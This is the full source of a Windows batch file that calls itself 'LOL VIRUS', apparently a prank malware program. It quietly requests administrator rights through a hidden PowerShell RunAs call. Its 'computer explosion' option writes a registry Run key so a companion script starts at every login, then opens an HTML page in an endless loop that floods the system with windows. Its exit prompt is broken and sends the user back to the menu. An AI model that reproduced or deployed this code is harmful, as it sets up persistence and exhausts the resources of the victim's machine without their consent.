@echo off
call :Adm
title LOL VIRUS by GGYT 
chcp 866
color a
cls
goto vir

:vir
cls
type C:\LOL_VIRUS\files\art.txt
echo Select an action:
echo.
echo 1 - Start computer explosion
echo 2 - Exit
echo 3 - DO NOT CHOOSE
echo 4 - Update Center (not soon)
echo 5 - Where is the virus located?

echo.
Set /p choice="Your choice: "
if not defined choice goto vir
if "%choice%"=="1" (goto xd)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\en\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto vir)
if "%choice%"=="5" (goto path)
cls
goto vir

:exit
set choice=0
cls
echo Are you sure you want to exit? (y/n)
Set /p choice="Choice: "
if not defined choice goto exit
if "%choice%"=="y" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 111 /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
goto yt

:yt
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:path
cls
echo.
echo He in C:\LOL_VIRUS
pause
goto vir

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





